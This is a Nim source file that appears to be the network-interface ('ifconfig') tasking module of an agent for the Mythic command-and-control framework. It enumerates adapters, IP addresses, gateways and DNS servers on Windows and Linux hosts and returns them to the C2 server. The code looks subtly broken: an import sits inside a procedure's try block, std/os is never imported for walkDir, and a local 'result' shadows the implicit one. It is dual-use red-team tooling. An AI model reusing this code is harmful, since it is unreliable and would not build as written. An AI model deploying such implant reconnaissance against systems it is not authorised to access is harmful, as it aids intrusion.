import ../config
import ../utils/mythic_responses
import std/[json, strformat, strutils]

when defined(windows):
  import winim/lean
  
  const
    GAA_FLAG_INCLUDE_GATEWAYS = 0x0080
    GAA_FLAG_INCLUDE_PREFIX = 0x0010
    AF_UNSPEC = 0
    
  type
    SOCKET_ADDRESS = object
      lpSockaddr: pointer
      iSockaddrLength: int32
    
    IP_ADAPTER_UNICAST_ADDRESS = object
      Length: ULONG
      Flags: DWORD
      Next: ptr IP_ADAPTER_UNICAST_ADDRESS
      Address: SOCKET_ADDRESS
      PrefixOrigin: int32
      SuffixOrigin: int32
      DadState: int32
      ValidLifetime: ULONG
      PreferredLifetime: ULONG
      LeaseLifetime: ULONG
      OnLinkPrefixLength: uint8
    
    IP_ADAPTER_GATEWAY_ADDRESS = object
      Length: ULONG
      Reserved: DWORD
      Next: ptr IP_ADAPTER_GATEWAY_ADDRESS
      Address: SOCKET_ADDRESS
    
    IP_ADAPTER_DNS_SERVER_ADDRESS = object
      Length: ULONG
      Reserved: DWORD
      Next: ptr IP_ADAPTER_DNS_SERVER_ADDRESS
      Address: SOCKET_ADDRESS
    
    IP_ADAPTER_ADDRESSES = object
      Length: ULONG
      IfIndex: DWORD
      Next: ptr IP_ADAPTER_ADDRESSES
      AdapterName: cstring
      FirstUnicastAddress: ptr IP_ADAPTER_UNICAST_ADDRESS
      FirstAnycastAddress: pointer
      FirstMulticastAddress: pointer
      FirstDnsServerAddress: ptr IP_ADAPTER_DNS_SERVER_ADDRESS
      DnsSuffix: LPWSTR
      Description: LPWSTR
      FriendlyName: LPWSTR
      PhysicalAddress: array[8, byte]
      PhysicalAddressLength: DWORD
      Flags: DWORD
      Mtu: DWORD
      IfType: DWORD
      OperStatus: DWORD
      Ipv6IfIndex: DWORD
      ZoneIndices: array[16, DWORD]
      FirstPrefix: pointer
      TransmitLinkSpeed: uint64
      ReceiveLinkSpeed: uint64
      FirstWinsServerAddress: pointer
      FirstGatewayAddress: ptr IP_ADAPTER_GATEWAY_ADDRESS
      Ipv4Metric: ULONG
      Ipv6Metric: ULONG
      Luid: uint64
      Dhcpv4Server: SOCKET_ADDRESS
      CompartmentId: DWORD
      NetworkGuid: array[16, byte]
      ConnectionType: int32
      TunnelType: int32
      Dhcpv6Server: SOCKET_ADDRESS
      Dhcpv6ClientDuid: array[130, byte]
      Dhcpv6ClientDuidLength: ULONG
      Dhcpv6Iaid: ULONG
      FirstDnsSuffix: pointer
    
    SOCKADDR = object
      sa_family: uint16
      sa_data: array[14, byte]
    
    SOCKADDR_IN = object
      sin_family: uint16
      sin_port: uint16
      sin_addr: array[4, byte]
      sin_zero: array[8, byte]
    
    SOCKADDR_IN6 = object
      sin6_family: uint16
      sin6_port: uint16
      sin6_flowinfo: uint32
      sin6_addr: array[16, byte]
      sin6_scope_id: uint32
  
  proc GetAdaptersAddresses(Family: ULONG, Flags: ULONG, Reserved: pointer,
                           AdapterAddresses: ptr IP_ADAPTER_ADDRESSES,
                           SizePointer: ptr ULONG): ULONG 
    {.importc, dynlib: "iphlpapi.dll", stdcall.}
  
  proc WSAAddressToStringA(lpsaAddress: pointer, dwAddressLength: DWORD,
                          lpProtocolInfo: pointer, lpszAddressString: ptr byte,
                          lpdwAddressStringLength: ptr DWORD): int32
    {.importc, dynlib: "ws2_32.dll", stdcall.}
  
  proc sockaddrToString(sockaddr: pointer): string =
    ## Convert a sockaddr to an IP address string using Windows API
    if sockaddr.isNil:
      return ""
    
    var buffer: array[46, byte]  # INET6_ADDRSTRLEN
    var bufferLen = DWORD(buffer.len)
    
    let result = WSAAddressToStringA(sockaddr, DWORD(buffer.len), nil, 
                                     cast[ptr byte](addr buffer[0]), addr bufferLen)
    
    if result != 0:
      return ""
    
    # Find null terminator and convert to string
    var strLen = 0
    while strLen < buffer.len and buffer[strLen] != 0:
      inc strLen
    
    if strLen > 0:
      var str = newString(strLen)
      for i in 0..<strLen:
        str[i] = char(buffer[i])
      return str
    else:
      return ""

when defined(posix):
  import std/[strutils, tables]
  
  proc readFile(path: string): string =
    try:
      var f: File
      if open(f, path):
        result = f.readAll()
        f.close()
    except:
      result = ""

proc ifconfig*(taskId: string, params: JsonNode): JsonNode =
  ## Get network interface configuration
  let cfg = getConfig()
  
  try:
    if cfg.debug:
      echo "[DEBUG] Ifconfig: Getting network interface information"
    
    var interfaces = newJArray()
    
    when defined(windows):
      var bufferSize: ULONG = 0
      
      # First call to get required buffer size
      discard GetAdaptersAddresses(AF_UNSPEC, 
                                  GAA_FLAG_INCLUDE_GATEWAYS or GAA_FLAG_INCLUDE_PREFIX,
                                  nil, nil, addr bufferSize)
      
      # Allocate buffer
      var buffer = newSeq[byte](bufferSize)
      let adapterAddresses = cast[ptr IP_ADAPTER_ADDRESSES](addr buffer[0])
      
      # Second call to get actual data
      let result = GetAdaptersAddresses(AF_UNSPEC,
                                       GAA_FLAG_INCLUDE_GATEWAYS or GAA_FLAG_INCLUDE_PREFIX,
                                       nil, adapterAddresses, addr bufferSize)
      
      if result != 0:
        return mythicError(taskId, &"GetAdaptersAddresses failed with error code: {result}")
      
      # Iterate through adapters
      var currentAdapter = adapterAddresses
      while not currentAdapter.isNil:
        let adapter = currentAdapter[]
        
        let description = $cast[WideCString](adapter.Description)
        let adapterName = $cast[WideCString](adapter.FriendlyName)
        let adapterId = $adapter.AdapterName
        let status = &"{adapter.OperStatus}"
        
        var addressesV4 = newJArray()
        var addressesV6 = newJArray()
        var dnsServers = newJArray()
        var gateways = newJArray()
        
        # Process unicast addresses
        var unicastAddr = adapter.FirstUnicastAddress
        while not unicastAddr.isNil:
          let address = unicastAddr[]
          let ipAddr = sockaddrToString(address.Address.lpSockaddr)
          if ipAddr.len > 0:
            if ipAddr.contains(":"):
              addressesV6.add(%ipAddr)
            else:
              addressesV4.add(%ipAddr)
          unicastAddr = address.Next
        
        # Process gateway addresses
        var gatewayAddr = adapter.FirstGatewayAddress
        while not gatewayAddr.isNil:
          let address = gatewayAddr[]
          let gateway = sockaddrToString(address.Address.lpSockaddr)
          if gateway.len > 0:
            gateways.add(%gateway)
          gatewayAddr = address.Next
        
        # Process DNS server addresses
        var dnsAddr = adapter.FirstDnsServerAddress
        while not dnsAddr.isNil:
          let address = dnsAddr[]
          let dns = sockaddrToString(address.Address.lpSockaddr)
          if dns.len > 0:
            dnsServers.add(%dns)
          dnsAddr = address.Next
        
        let dnsSuffix = $cast[WideCString](adapter.DnsSuffix)
        
        var iface = %*{
          "description": description,
          "adapter_name": adapterName,
          "adapter_id": adapterId,
          "status": status,
          "addresses_v4": addressesV4,
          "addresses_v6": addressesV6,
          "dns_servers": dnsServers,
          "gateways": gateways,
          "dhcp_addresses": newJArray(),
          "dns_enabled": not adapter.FirstDnsServerAddress.isNil,
          "dns_suffix": dnsSuffix,
          "dynamic_dns_enabled": false
        }
        
        interfaces.add(iface)
        currentAdapter = adapter.Next
    
    when defined(posix):
      # Read network interfaces from /sys/class/net/
      var interfaceMap = initTable[string, JsonNode]()
      
      for kind, path in walkDir("/sys/class/net"):
        if kind == pcDir or kind == pcLinkToDir:
          let name = path.splitPath().tail
          
          # Get MAC address
          let macPath = &"/sys/class/net/{name}/address"
          let adapterId = readFile(macPath).strip()
          
          # Get status
          let statusPath = &"/sys/class/net/{name}/operstate"
          let status = readFile(statusPath).strip()
          
          var iface = %*{
            "description": name,
            "adapter_name": name,
            "adapter_id": adapterId,
            "status": status,
            "addresses_v4": newJArray(),
            "addresses_v6": newJArray(),
            "dns_servers": newJArray(),
            "gateways": newJArray(),
            "dhcp_addresses": newJArray(),
            "dns_enabled": false,
            "dns_suffix": "",
            "dynamic_dns_enabled": false
          }
          
          interfaceMap[name] = iface
      
      # Get IP addresses from ip command
      try:
        let ipOutput = readFile("/proc/net/fib_trie")
        # Parse interface addresses - this is complex, use ip addr as fallback
        discard
      except:
        discard
      
      # Try to get addresses using getifaddrs-like approach via /proc/net/if_inet6 and ip command
      # Read IPv4 addresses
      try:
        import std/osproc
        let (output, exitCode) = execCmdEx("ip -4 addr show")
        if exitCode == 0:
          var currentIface = ""
          for line in output.splitLines():
            let trimmed = line.strip()
            if line.len > 0 and line[0].isDigit():
              # New interface line
              let parts = line.split()
              if parts.len > 1:
                currentIface = parts[1].strip(':')
            elif trimmed.startsWith("inet "):
              let parts = trimmed.split()
              if parts.len > 1 and interfaceMap.hasKey(currentIface):
                let ipAddr = parts[1].split('/')[0]
                interfaceMap[currentIface]["addresses_v4"].add(%ipAddr)
      except:
        discard
      
      # Read IPv6 addresses
      try:
        import std/osproc
        let (output, exitCode) = execCmdEx("ip -6 addr show")
        if exitCode == 0:
          var currentIface = ""
          for line in output.splitLines():
            let trimmed = line.strip()
            if line.len > 0 and line[0].isDigit():
              let parts = line.split()
              if parts.len > 1:
                currentIface = parts[1].strip(':')
            elif trimmed.startsWith("inet6 "):
              let parts = trimmed.split()
              if parts.len > 1 and interfaceMap.hasKey(currentIface):
                let ipAddr = parts[1].split('/')[0]
                if not ipAddr.startsWith("fe80"):  # Skip link-local unless needed
                  interfaceMap[currentIface]["addresses_v6"].add(%ipAddr)
      except:
        discard
      
      # Read DNS servers from /etc/resolv.conf
      let resolvConf = readFile("/etc/resolv.conf")
      var dnsServers = newJArray()
      for line in resolvConf.splitLines():
        let trimmed = line.strip()
        if trimmed.startsWith("nameserver"):
          let parts = trimmed.split()
          if parts.len > 1:
            dnsServers.add(%parts[1])
      
      # Read default gateway from /proc/net/route
      var defaultGateway = ""
      let routeTable = readFile("/proc/net/route")
      for line in routeTable.splitLines():
        let parts = line.split('\t')
        if parts.len > 2 and parts[1] == "00000000":  # Destination 0.0.0.0 = default route
          # Gateway is in hex format (little-endian), convert to IP
          let gatewayHex = parts[2]
          if gatewayHex.len == 8:
            try:
              let b1 = parseHexInt(gatewayHex[6..7])
              let b2 = parseHexInt(gatewayHex[4..5])
              let b3 = parseHexInt(gatewayHex[2..3])
              let b4 = parseHexInt(gatewayHex[0..1])
              defaultGateway = &"{b1}.{b2}.{b3}.{b4}"
            except:
              discard
          break
      
      # Add DNS and gateway info to all interfaces
      for name, iface in interfaceMap:
        iface["dns_servers"] = dnsServers
        iface["dns_enabled"] = %(dnsServers.len > 0)
        if defaultGateway.len > 0:
          iface["gateways"].add(%defaultGateway)
        interfaces.add(iface)
    
    if cfg.debug:
      echo &"[DEBUG] Ifconfig: Found {interfaces.len} network interfaces"
    
    let output = $interfaces
    return mythicSuccess(taskId, output)
    
  except Exception as e:
    return mythicError(taskId, &"Ifconfig error: {e.msg}")
